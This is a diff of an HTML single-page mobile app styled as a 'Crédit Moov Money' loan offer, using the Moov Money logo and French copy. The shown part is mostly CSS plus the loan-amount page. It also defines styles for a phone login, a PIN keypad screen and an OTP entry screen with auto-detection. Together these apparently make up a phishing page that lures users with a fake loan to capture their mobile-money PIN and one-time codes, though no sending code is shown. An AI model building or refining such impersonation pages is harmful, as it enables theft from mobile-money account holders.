@@ -4,459 +4,647 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Moov Money</title>
-  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700;800;900&family=DM+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
-    :root{--orange:#FF6A00;--orange-dark:#F04B00;--orange-light:#FFF0E5;--orange-tint:#FFF5F0;--text:#1a1a1a;--sub:#6b6b6b;--hint:#9ca3af;--border:#e5e7eb;--bg:#f9fafb;--white:#ffffff;--blue:#2255d6;--blue-dark:#14329e;--green:#22a745;--red-err:#e53e3e}
-    html,body{height:100%;font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif;background:var(--bg);display:flex;justify-content:center;margin:0;padding:0;-webkit-font-smoothing:antialiased}
-    .phone{width:390px;min-height:100vh;background:var(--white);display:flex;flex-direction:column;position:relative;overflow:hidden}
-    @media(max-width:430px){body{background:var(--white)}.phone{width:100%;min-height:100dvh}}
-    .scr{display:none;flex-direction:column;min-height:100vh}
-    @media(max-width:430px){.scr{min-height:100dvh}}
-    .scr.active{display:flex}
-    .hdr{padding:18px 20px 0;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
-    .step-label{font-size:12px;color:var(--hint);font-weight:400}
-    .top-accent{height:3px;background:linear-gradient(90deg,var(--orange) 0%,var(--orange-dark) 100%);flex-shrink:0}
-    .prog{height:3px;background:var(--border);flex-shrink:0}
-    .prog-fill{height:100%;background:linear-gradient(90deg,var(--orange),var(--orange-dark));transition:width .4s}
-    .body{padding:24px 20px 16px;flex:1;display:flex;flex-direction:column;overflow-y:auto;-webkit-overflow-scrolling:touch}
-    .foot{padding:12px 20px 28px;border-top:1px solid var(--border);flex-shrink:0;background:var(--white)}
-    .loan-title-section{text-align:center;margin-bottom:32px;padding-top:16px}
-    .loan-title{font-size:28px;font-weight:800;color:var(--text);margin-bottom:8px}
-    .loan-subtitle{font-size:15px;color:var(--sub);line-height:1.5}
-    .amount-card{background:var(--white);border:1.5px solid var(--border);border-radius:16px;padding:24px 20px;margin-bottom:24px;text-align:center}
-    .amount-label{font-size:13px;color:var(--sub);text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;font-weight:600}
-    .amount-display{font-size:48px;font-weight:700;color:var(--orange);margin-bottom:4px;letter-spacing:-1px}
-    .amount-range{font-size:13px;color:var(--hint);margin-bottom:20px}
-    .amount-input-wrap{margin-bottom:20px}
-    .amount-input-wrap label{display:block;font-size:13px;color:var(--sub);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
-    .amount-input-row{display:flex;align-items:center;gap:10px;background:var(--white);border:1.5px solid var(--border);border-radius:12px;padding:4px 14px;transition:border-color .15s}
-    .amount-input-row:focus-within{border-color:var(--orange)}
-    .currency-symbol{font-size:18px;color:var(--text);font-weight:600;flex-shrink:0}
-    .amount-input-row input{flex:1;padding:13px 0;background:0 0;border:none;font-size:18px;font-family:inherit;font-weight:500;color:var(--text);outline:0}
-    .amount-input-row input::placeholder{color:var(--hint)}
-    .amount-error{font-size:12px;color:#e53e3e;margin-top:8px;display:none;padding-left:4px}
-    .amount-error.show{display:block}
-    input[type=range]{width:100%;height:6px;-webkit-appearance:none;appearance:none;background:linear-gradient(90deg,var(--orange) 0%,var(--border) 0%);border-radius:6px;outline:0;cursor:pointer;display:block}
-    input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:28px;height:28px;border-radius:50%;background:var(--white);border:3px solid var(--orange);cursor:pointer;box-shadow:0 2px 8px rgba(255,106,0,.3);transition:transform .15s}
-    input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.1)}
-    input[type=range]::-moz-range-thumb{width:28px;height:28px;border-radius:50%;background:var(--white);border:3px solid var(--orange);cursor:pointer}
-    .range-limits{display:flex;justify-content:space-between;margin-top:10px}
-    .range-limits span{font-size:12px;color:var(--hint)}
-    .dur-label{font-size:13px;color:var(--sub);margin-bottom:10px;display:block;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
-    .dur-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:24px}
-    .dur-opt{padding:14px;border:1.5px solid var(--border);border-radius:12px;background:var(--white);font-size:14px;color:var(--sub);cursor:pointer;font-family:inherit;text-align:center;transition:all .2s;font-weight:500}
-    .dur-opt:hover{border-color:var(--orange);color:var(--orange)}
-    .dur-opt.selected{border-color:var(--orange);color:var(--orange);background:var(--orange-light);font-weight:700;box-shadow:0 2px 8px rgba(255,106,0,.1)}
-    .detail-card{background:var(--orange-light);border-radius:12px;padding:16px;margin-bottom:16px}
-    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
-    .detail-row:not(:last-child){border-bottom:1px solid rgba(255,106,0,.15)}
-    .detail-lbl{font-size:14px;color:var(--sub)}
-    .detail-val{font-size:14px;color:var(--text);font-weight:600}
-    .spacer{flex:1;min-height:16px}
-    .section-title{font-size:26px;font-weight:800;color:var(--text);margin-bottom:6px}
-    .section-sub{font-size:15px;color:var(--sub);margin-bottom:26px;line-height:1.55}
-    .field{margin-bottom:16px}
-    .flbl{display:block;font-size:13px;color:var(--sub);margin-bottom:6px;font-weight:700;text-transform:uppercase}
-    .field input,.field select{width:100%;padding:14px 14px;background:var(--white);border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-family:inherit;font-weight:400;color:var(--text);outline:0;-webkit-appearance:none;transition:border-color .15s}
-    .field select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%236b6b6b' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px}
-    .field input:focus,.field select:focus{border-color:var(--orange)}
-    .field input::placeholder{color:var(--hint)}
-    .fpair{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-    .btn-primary{display:block;width:100%;padding:16px;background:var(--blue-dark);border:none;border-radius:10px;font-size:16px;font-weight:700;color:var(--white);cursor:pointer;font-family:inherit;letter-spacing:.2px;transition:background .2s}
-    .btn-primary:hover{background:#0f2680}
-    .btn-primary:disabled{background:#a9c2e8;cursor:not-allowed}
-    .brow{display:flex;gap:10px}
-    .brow .btn-primary{flex:2}
-    .btn-back{flex:1;padding:16px;background:0 0;border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-weight:500;color:var(--sub);cursor:pointer;font-family:inherit}
-    .btn-ghost{display:block;width:100%;padding:15px;background:0 0;border:none;font-size:14px;font-weight:400;color:var(--sub);cursor:pointer;font-family:inherit;margin-top:2px}
-    .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,106,0,.5);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column}
-    .overlay-card{background:var(--white);border-radius:20px;padding:36px 28px;text-align:center;max-width:320px;width:90%;box-shadow:0 20px 60px rgba(255,106,0,.25)}
-    .overlay-spinner{width:52px;height:52px;border:3.5px solid var(--border);border-top-color:var(--orange);border-right-color:var(--orange-dark);border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 20px}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    .overlay-title{font-size:19px;font-weight:700;color:var(--text);margin-bottom:8px}
-    .overlay-desc{font-size:14px;color:var(--sub);line-height:1.6}
-    .overlay-error{color:#e53e3e;margin-top:16px;font-size:13px;display:none}
-    .succ-wrap{flex:1;display:flex;flex-direction:column;padding:48px 24px 32px}
-    .succ-icon{width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--orange-dark));display:flex;align-items:center;justify-content:center;margin-bottom:24px;box-shadow:0 8px 20px rgba(255,106,0,.25)}
-    .succ-icon svg{width:22px;height:22px;stroke:var(--white);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
-    .succ-h{font-size:22px;font-weight:700;color:var(--text);margin-bottom:10px;letter-spacing:-.3px}
-    .succ-p{font-size:15px;color:var(--sub);line-height:1.65;margin-bottom:28px}
-    .ref-box{background:var(--orange-light);border:1.5px solid var(--orange);border-radius:10px;padding:16px;margin-bottom:auto}
-    .ref-lbl{font-size:12px;color:var(--orange-dark);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px;font-weight:700}
-    .ref-val{font-size:15px;font-weight:700;color:var(--text)}
-    .fnote{font-size:12px;color:var(--hint);margin-top:32px;text-align:center}
+    :root{--orange:#FF6A00;--orange-dark:#F04B00;--orange-light:#FFF0E5;--text:#1a1a1a;--sub:#6b6b6b;--hint:#9ca3af;--border:#e5e7eb;--white:#ffffff;--blue-dark:#14329e;--green:#22a745;--red-err:#e53e3e}
+    html,body{height:100%;font-family:Arial,Helvetica,sans-serif;background:#f5f5f5;display:flex;justify-content:center;margin:0;padding:0}
+    .phone{width:390px;min-height:100vh;background:var(--white);position:relative;overflow:hidden}
+    @media(max-width:430px){.phone{width:100%;min-height:100dvh}}
+    .page{display:none;flex-direction:column;min-height:100vh}
+    .page.active{display:flex}
     
-    /* LOGIN SCREEN */
-    .scr.moov-login-scr{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;padding:0;align-items:stretch;position:relative}
-    .moov-header{position:relative;background:linear-gradient(135deg,#FF7A00 0%,#FF5A00 55%,#F04B00 100%);height:175px;overflow:hidden;flex-shrink:0}
-    .moov-header .circle-decor{position:absolute;top:-40px;left:-30px;width:160px;height:160px;border-radius:50%;background:rgba(255,255,255,.06)}
-    .moov-header .dots{position:absolute;top:6px;right:6px;width:110px;height:80px;background-image:radial-gradient(rgba(255,255,255,.55) 1.3px,transparent 1.3px);background-size:10px 10px;opacity:.7}
-    .moov-header .rings{position:absolute;top:15px;right:-35px;width:170px;height:170px;border-radius:50%;border:1.3px solid rgba(255,255,255,.35)}
-    .moov-header .rings::before,.moov-header .rings::after{content:"";position:absolute;border-radius:50%;border:1.3px solid rgba(255,255,255,.25)}
-    .moov-header .rings::before{top:20px;left:20px;right:20px;bottom:20px}
-    .moov-header .rings::after{top:40px;left:40px;right:40px;bottom:40px;border-color:rgba(255,255,255,.2)}
-    .back-arrow{position:absolute;top:30px;left:22px;width:24px;height:24px;z-index:5;cursor:pointer}
-    .back-arrow svg{width:100%;height:100%;stroke:#fff}
-    .wave{position:absolute;bottom:-1px;left:0;width:100%;height:60px;z-index:3}
-    .logo-wrap{position:absolute;top:68px;left:50%;transform:translateX(-50%);width:145px;height:145px;z-index:4}
-    .logo-diamond{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
-    .logo-diamond img{width:100%;height:100%;object-fit:contain;filter:drop-shadow(0 10px 20px rgba(0,0,0,.15))}
-    .moov-body-content{flex:1;padding:28px 24px 24px;display:flex;flex-direction:column}
-    .moov-title{font-size:30px;font-weight:800;color:#1a1a1a;margin-bottom:10px}
-    .moov-subtitle{font-size:15.5px;color:#6b6b6b;margin-bottom:22px}
+    /* Common */
+    .top-bar{height:3px;background:linear-gradient(90deg,var(--orange),var(--orange-dark));flex-shrink:0}
+    .hdr-row{padding:14px 20px;display:flex;align-items:center;flex-shrink:0}
+    .hdr-row img{width:80px;height:auto}
+    .step-tag{font-size:12px;color:var(--hint)}
+    .progress-bar{height:3px;background:var(--border);flex-shrink:0}
+    .progress-fill{height:100%;background:linear-gradient(90deg,var(--orange),var(--orange-dark))}
+    .content{padding:20px;flex:1;display:flex;flex-direction:column;overflow-y:auto}
+    .footer{padding:12px 20px 24px;border-top:1px solid var(--border);flex-shrink:0;background:var(--white)}
+    .spacer{flex:1}
+    .btn{display:block;width:100%;padding:15px;background:var(--blue-dark);border:none;border-radius:10px;font-size:16px;font-weight:700;color:var(--white);cursor:pointer;font-family:inherit}
+    .btn:active{opacity:0.85}
+    .btn:disabled{background:#a9c2e8;cursor:not-allowed}
+    .btn-outline{flex:1;padding:15px;background:transparent;border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-weight:500;color:var(--sub);cursor:pointer;font-family:inherit}
+    .input-field{width:100%;padding:13px 14px;background:var(--white);border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-family:inherit;outline:none}
+    .input-field:focus{border-color:var(--orange)}
+    .label{display:block;font-size:12px;color:var(--sub);margin-bottom:5px;font-weight:700;text-transform:uppercase}
     
-    /* Country Selector */
-    .country-selector-wrap{position:relative;margin-bottom:22px}
-    .country-selector{display:flex;align-items:center;gap:10px;border:1.5px solid #d8d8d8;border-radius:10px;padding:14px 14px;cursor:pointer;transition:border-color .15s;background:#fff;position:relative}
-    .country-selector:hover{border-color:#2255d6}
-    .country-selector.open{border-color:#2255d6}
-    .country-dropdown{display:none;position:absolute;top:calc(100% + 4px);left:0;right:0;background:#fff;border:1.5px solid #d8d8d8;border-radius:10px;z-index:20;box-shadow:0 8px 24px rgba(0,0,0,.12);overflow:hidden}
-    .country-dropdown.show{display:block}
-    .country-option{display:flex;align-items:center;gap:10px;padding:14px 14px;cursor:pointer;transition:background .15s}
-    .country-option:hover{background:#f5f6f8}
-    .country-option:first-child{border-bottom:1px solid #f0f0f0}
+    /* Loan */
+    .loan-title{font-size:24px;font-weight:800;color:var(--text);text-align:center;margin-bottom:6px}
+    .loan-sub{font-size:14px;color:var(--sub);text-align:center;margin-bottom:24px}
+    .amount-card{background:var(--white);border:1.5px solid var(--border);border-radius:14px;padding:20px;margin-bottom:18px;text-align:center}
+    .amount-card .lbl{font-size:12px;color:var(--sub);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;font-weight:600}
+    .amount-card .val{font-size:40px;font-weight:700;color:var(--orange)}
+    .amount-card .range-txt{font-size:12px;color:var(--hint);margin-bottom:16px}
+    input[type=range]{width:100%;height:5px;-webkit-appearance:none;appearance:none;background:#e5e7eb;border-radius:5px;outline:none;cursor:pointer}
+    input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:26px;height:26px;border-radius:50%;background:var(--white);border:3px solid var(--orange);cursor:pointer}
+    .range-ends{display:flex;justify-content:space-between;margin-top:8px;font-size:11px;color:var(--hint)}
+    .dur-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:18px}
+    .dur-btn{padding:12px;border:1.5px solid var(--border);border-radius:10px;font-size:14px;cursor:pointer;text-align:center;font-family:inherit;background:var(--white);color:var(--sub)}
+    .dur-btn.sel{border-color:var(--orange);color:var(--orange);background:var(--orange-light);font-weight:700}
+    .summary-box{background:var(--orange-light);border-radius:10px;padding:14px}
+    .summary-row{display:flex;justify-content:space-between;padding:9px 0;font-size:14px}
+    .summary-row:not(:last-child){border-bottom:1px solid rgba(255,106,0,0.12)}
+    .summary-row .sl{color:var(--sub)}.summary-row .sv{color:var(--text);font-weight:600}
     
-    /* Phone Input */
-    .moov-phone-input{display:flex;align-items:center;border:1.5px solid #2255d6;border-radius:10px;padding:16px 16px;gap:12px;position:relative;margin-bottom:6px}
-    .country-code{font-size:17px;color:#1a1a1a;font-weight:500;border-right:1px solid #d8d8d8;padding-right:12px;min-width:50px}
-    .phone-number{flex:1;font-size:17px;color:#1a1a1a;border:none;outline:0;font-weight:400}
-    .phone-number:disabled{background:#f9f9f9;color:#9ca3af;cursor:not-allowed}
-    .digit-hint{font-size:11px;color:#9ca3af;margin-bottom:18px;text-align:right}
+    /* Personal Info */
+    .info-title{font-size:22px;font-weight:800;color:var(--text);margin-bottom:4px}
+    .info-sub{font-size:14px;color:var(--sub);margin-bottom:20px}
+    .two-cols{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
+    .field-grp{margin-bottom:14px}
     
-    .terms-row{display:flex;align-items:flex-start;gap:12px;margin-bottom:18px}
-    .terms-checkbox{width:22px;height:22px;background:0 0;border:2px solid #1d4ed8;border-radius:5px;flex-shrink:0;display:flex;align-items:center;justify-content:center;margin-top:2px;cursor:pointer}
-    .terms-checkbox svg{width:14px;height:14px;stroke:#1d4ed8;stroke-width:3}
-    .terms-text{font-size:15px;color:#444;line-height:1.4}
-    .terms-text a{color:#1d4ed8;text-decoration:none}
-    .continue-btn{width:100%;background:#14329e;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;padding:17px;cursor:pointer}
-    .continue-btn:hover{background:#0f2680}
+    /* Login */
+    .orange-header{position:relative;background:linear-gradient(135deg,#FF7A00,#FF5A00,#F04B00);height:160px;overflow:hidden;flex-shrink:0}
+    .orange-header .decor{position:absolute;top:-30px;left:-20px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,0.05)}
+    .orange-header .ring{position:absolute;top:10px;right:-30px;width:150px;height:150px;border-radius:50%;border:1px solid rgba(255,255,255,0.3)}
+    .back-arrow-btn{position:absolute;top:25px;left:18px;background:none;border:none;color:#fff;font-size:24px;cursor:pointer;z-index:5}
+    .logo-float{position:absolute;top:55px;left:50%;transform:translateX(-50%);width:120px;height:120px;z-index:4}
+    .logo-float img{width:100%;height:100%;object-fit:contain;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.15))}
+    .wave-svg{position:absolute;bottom:0;left:0;width:100%;height:35px}
+    .login-content{flex:1;padding:24px 20px;display:flex;flex-direction:column}
+    .login-title{font-size:26px;font-weight:800;color:var(--text);margin-bottom:4px}
+    .login-sub{font-size:14px;color:var(--sub);margin-bottom:20px}
     
-    /* PIN SCREEN */
-    .scr.pin-scr{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;padding:0;align-items:center;justify-content:center}
-    .pin-container{display:flex;flex-direction:column;align-items:center;padding:40px 24px;width:100%}
-    .pin-logo{width:100px;height:auto;margin-bottom:32px;object-fit:contain}
-    .pin-title{font-size:24px;font-weight:700;color:#1a1a1a;margin-bottom:8px;text-align:center}
-    .pin-subtitle{font-size:15px;color:#6b6b6b;margin-bottom:28px;text-align:center;line-height:1.4}
-    .pin-input-wrap{width:100%;max-width:280px;margin-bottom:8px}
-    .pin-input{width:100%;padding:16px 20px;border:2px solid #d8dce6;border-radius:12px;font-size:24px;font-weight:700;color:#1a1a1a;text-align:center;letter-spacing:8px;outline:0;background:#fff;font-family:inherit;transition:border-color .15s,box-shadow .15s}
-    .pin-input:focus{border-color:var(--orange);box-shadow:0 0 0 3px rgba(255,106,0,.12)}
-    .pin-input.error{border-color:var(--red-err);animation:shake .4s ease}
-    .pin-input.valid{border-color:var(--green)}
-    @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
-    .pin-hint{font-size:12px;color:var(--hint);text-align:center;margin-bottom:4px}
-    .pin-error-text{text-align:center;color:var(--red-err);font-size:14px;min-height:22px;margin-bottom:8px;font-weight:600;opacity:0;transition:opacity .2s}
-    .pin-error-text.show{opacity:1}
-    .forgot-pin-wrap{text-align:center;margin-bottom:20px}
-    .forgot-pin-link{color:var(--orange);font-size:14px;font-weight:600;text-decoration:none;cursor:pointer}
-    .forgot-pin-link:hover{text-decoration:underline}
-    .pin-submit-btn{width:100%;max-width:280px;padding:16px;background:var(--blue-dark);color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;font-family:inherit;transition:background .2s}
-    .pin-submit-btn:hover{background:#0f2680}
-    .pin-submit-btn:disabled{background:#a9c2e8;cursor:not-allowed}
-    .pin-back-btn{position:absolute;top:20px;left:20px;background:0 0;border:none;font-size:24px;color:#1a1a1a;cursor:pointer;padding:8px;z-index:5}
+    /* Country */
+    .country-wrap{position:relative;margin-bottom:18px}
+    .country-select{display:flex;align-items:center;gap:8px;border:1.5px solid #d8d8d8;border-radius:10px;padding:13px 12px;cursor:pointer;background:#fff}
+    .country-drop{display:none;position:absolute;top:100%;left:0;right:0;background:#fff;border:1.5px solid #d8d8d8;border-radius:10px;z-index:10;margin-top:3px;box-shadow:0 6px 20px rgba(0,0,0,0.1)}
+    .country-drop.open{display:block}
+    .country-opt{display:flex;align-items:center;gap:8px;padding:13px 12px;cursor:pointer}
+    .country-opt:hover{background:#f5f5f5}
+    .country-opt:first-child{border-bottom:1px solid #eee}
     
-    /* OTP SCREEN */
-    .scr.moov-otp-scr{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;padding:0;align-items:stretch}
-    .moov-otp-header{background:#FF6A00;height:60px;display:flex;align-items:center;padding:0 20px;flex-shrink:0}
-    .moov-otp-body{flex:1;padding:28px 24px 24px;display:flex;flex-direction:column}
-    .moov-otp-title{font-size:26px;font-weight:800;color:#1a1a1a;margin-bottom:14px}
-    .moov-otp-subtitle{font-size:15.5px;color:#6b6b6b;line-height:1.4;margin-bottom:26px}
-    .otp-row{display:flex;gap:8px;margin-bottom:20px;justify-content:center}
-    .otp-box{width:31px;height:36px;border:1.5px solid #d8d8d8;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:#1a1a1a;outline:0;text-align:center;background:#fff}
-    .otp-box:focus,.otp-box.filled{border-color:#2255d6}
-    .otp-box.auto-filled{border-color:var(--green);background:#f0fdf4}
-    .resend{font-size:15px;color:#444;text-align:center}
-    .resend strong{font-weight:700;color:#1a1a1a}
-    .moov-continue-btn{width:100%;background:#a9c2e8;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;padding:17px;cursor:not-allowed}
-    .moov-continue-btn.active{background:#14329e;cursor:pointer}
-    .otp-auto-detect{text-align:center;font-size:12px;color:var(--green);margin-top:8px;min-height:18px;font-weight:500}
+    .phone-row{display:flex;align-items:center;border:1.5px solid #2255d6;border-radius:10px;padding:14px 14px;gap:10px;margin-bottom:4px}
+    .phone-row .cc{font-size:15px;font-weight:500;min-width:45px}
+    .phone-row .divider{color:#ddd}
+    .phone-row input{flex:1;border:none;font-size:16px;outline:none;font-family:inherit}
+    .phone-row input:disabled{background:#f9f9f9;color:#999}
+    .digit-info{font-size:11px;color:var(--hint);text-align:right;margin-bottom:16px}
+    
+    .terms-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:16px}
+    .terms-box{width:20px;height:20px;border:2px solid #1d4ed8;border-radius:5px;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;margin-top:2px}
+    .terms-box svg{width:13px;height:13px;stroke:#1d4ed8;stroke-width:3;display:none}
+    .terms-txt{font-size:14px;color:#444}
+    .terms-txt a{color:#1d4ed8;text-decoration:none}
+    
+    /* PIN */
+    .pin-page{background:#fff;align-items:center;justify-content:center;position:relative}
+    .pin-wrap{text-align:center;padding:30px 20px}
+    .pin-wrap img{width:85px;margin-bottom:24px}
+    .pin-wrap h2{font-size:22px;margin-bottom:4px}
+    .pin-wrap p{color:var(--sub);font-size:14px;margin-bottom:22px}
+    .pin-dots-row{display:flex;gap:10px;justify-content:center;margin-bottom:4px}
+    .pin-dot{width:45px;height:45px;border:2px solid #ddd;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700}
+    .pin-dot.filled{border-color:var(--orange)}
+    .pin-err{color:var(--red-err);font-size:13px;font-weight:600;min-height:18px;margin-bottom:4px;opacity:0}
+    .pin-err.show{opacity:1}
+    .pin-forgot{color:var(--orange);font-size:13px;font-weight:600;text-decoration:none;cursor:pointer;display:inline-block;margin-bottom:14px}
+    .keypad-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;max-width:260px;margin:0 auto}
+    .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f2f2f2;font-size:22px;font-weight:600;cursor:pointer;font-family:inherit}
+    .key-btn:active{background:#ddd}
+    
+    /* OTP */
+    .otp-header{background:#FF6A00;height:52px;display:flex;align-items:center;padding:0 18px;flex-shrink:0}
+    .otp-body{padding:24px 20px;flex:1;display:flex;flex-direction:column}
+    .otp-body h2{font-size:22px;margin-bottom:6px}
+    .otp-body .sub{color:var(--sub);font-size:14px;margin-bottom:22px}
+    .otp-boxes{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
+    .otp-b{width:40px;height:46px;border:1.5px solid #ddd;border-radius:8px;text-align:center;font-size:18px;font-weight:700;outline:none;background:#fff}
+    .otp-b:focus{border-color:#2255d6}
+    .timer-txt{text-align:center;color:#444;font-size:14px;margin-bottom:18px}
+    .timer-txt strong{font-weight:700}
+    
+    /* Success */
+    .succ-content{padding:40px 24px;flex:1;display:flex;flex-direction:column;align-items:center}
+    .succ-circle{width:50px;height:50px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--orange-dark));display:flex;align-items:center;justify-content:center;margin-bottom:20px}
+    .succ-circle svg{width:22px;height:22px;stroke:#fff;fill:none;stroke-width:2.5}
+    .succ-content h2{font-size:20px;margin-bottom:8px}
+    .succ-content .msg{color:var(--sub);font-size:14px;text-align:center;margin-bottom:24px;line-height:1.5}
+    .ref-card{background:var(--orange-light);border:1.5px solid var(--orange);border-radius:10px;padding:14px;width:100%;margin-bottom:auto}
+    .ref-card .rl{font-size:11px;color:var(--orange-dark);font-weight:700;text-transform:uppercase;margin-bottom:3px}
+    .ref-card .rv{font-size:14px;font-weight:700;color:var(--text)}
+    .footnote{font-size:11px;color:var(--hint);margin-top:24px;text-align:center}
   </style>
 </head>
 <body>
 <div class="phone">
-  <div class="overlay" id="overlay" style="display:none"><div class="overlay-card" id="overlayCard"></div></div>
 
-  <!-- PAGE 0: MONTANT DU PRÊT -->
-  <div class="scr active" id="s-land">
-    <div class="top-accent"></div>
-    <div class="hdr"><div style="display:flex;align-items:center"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" style="width:93px;height:auto;object-fit:contain" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Moov_Money_Flooz.png/512px-Moov_Money_Flooz.png'"></div></div>
-    <div class="body">
-      <div class="loan-title-section"><h1 class="loan-title">Crédit Moov Money</h1><p class="loan-subtitle">Choisissez le montant et la durée de votre prêt</p></div>
+  <!-- PAGE 0: LOAN AMOUNT -->
+  <div class="page active" id="pg0">
+    <div class="top-bar"></div>
+    <div class="hdr-row"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov"></div>
+    <div class="content">
+      <h1 class="loan-title">Crédit Moov Money</h1>
+      <p class="loan-sub">Choisissez le montant et la durée de votre prêt</p>
+      
       <div class="amount-card">
-        <div class="amount-label">Montant du prêt</div>
-        <div class="amount-display" id="loanAmt">1 000 FCFA</div>
-        <div class="amount-range">1 000 – 100 000 FCFA</div>
-        <input type="range" id="slider" min="1000" max="100000" value="1000" step="500" oninput="sliderChange(this.value)">
-        <div class="range-limits"><span>1 000 FCFA</span><span>100 000 FCFA</span></div>
+        <div class="lbl">Montant du prêt</div>
+        <div class="val" id="amtDisplay">1 000 FCFA</div>
+        <div class="range-txt">1 000 – 100 000 FCFA</div>
+        <input type="range" min="1000" max="100000" value="1000" step="500" id="amountSlider" oninput="onSlider(this.value)">
+        <div class="range-ends"><span>1 000</span><span>100 000</span></div>
       </div>
-      <div class="amount-input-wrap"><label for="amountInput">Montant personnalisé</label><div class="amount-input-row"><span class="currency-symbol">FCFA</span><input type="text" id="amountInput" inputmode="numeric" pattern="[0-9]*" placeholder="Entrez le montant" value="" oninput="amountInputChange(this.value)"></div><div class="amount-error" id="amountError">Le montant minimum est de 1 000 FCFA</div></div>
-      <span class="dur-label">Durée de remboursement</span>
-      <div class="dur-grid">
-        <button class="dur-opt selected" data-val="6" onclick="selectDur(this)">6 mois</button>
-        <button class="dur-opt" data-val="12" onclick="selectDur(this)">12 mois</button>
-        <button class="dur-opt" data-val="18" onclick="selectDur(this)">18 mois</button>
-        <button class="dur-opt" data-val="24" onclick="selectDur(this)">24 mois</button>
+      
+      <div style="margin-bottom:14px">
+        <label class="label">Montant personnalisé</label>
+        <div style="display:flex;align-items:center;gap:8px;border:1.5px solid var(--border);border-radius:10px;padding:4px 12px">
+          <span style="font-weight:600">FCFA</span>
+          <input class="input-field" id="customAmt" placeholder="Entrez le montant" style="border:none;padding:12px 0" oninput="onCustomAmount(this.value)">
+        </div>
+        <div id="amtErr" style="font-size:11px;color:var(--red-err);margin-top:4px;display:none">Minimum 1 000 FCFA</div>
       </div>
-      <div class="detail-card">
-        <div class="detail-row"><span class="detail-lbl">Paiement mensuel</span><span class="detail-val" id="land-monthly">—</span></div>
-        <div class="detail-row"><span class="detail-lbl">Taux d'intérêt</span><span class="detail-val">5% par an, fixe</span></div>
-        <div class="detail-row"><span class="detail-lbl">Total à rembourser</span><span class="detail-val" id="land-total">—</span></div>
+      
+      <label class="label">Durée de remboursement</label>
+      <div class="dur-grid" id="durGrid">
+        <button class="dur-btn sel" data-dur="6" onclick="pickDur(this)">6 mois</button>
+        <button class="dur-btn" data-dur="12" onclick="pickDur(this)">12 mois</button>
+        <button class="dur-btn" data-dur="18" onclick="pickDur(this)">18 mois</button>
+        <button class="dur-btn" data-dur="24" onclick="pickDur(this)">24 mois</button>
+      </div>
+      
+      <div class="summary-box">
+        <div class="summary-row"><span class="sl">Paiement mensuel</span><span class="sv" id="monthlyVal">—</span></div>
+        <div class="summary-row"><span class="sl">Taux d'intérêt</span><span class="sv">5% par an, fixe</span></div>
+        <div class="summary-row"><span class="sl">Total à rembourser</span><span class="sv" id="totalVal">—</span></div>
       </div>
       <div class="spacer"></div>
     </div>
-    <div class="foot"><button class="btn-primary" onclick="go('s-land','s-p1')">Continuer</button></div>
+    <div class="footer"><button class="btn" onclick="goTo('pg1')">Continuer</button></div>
   </div>
 
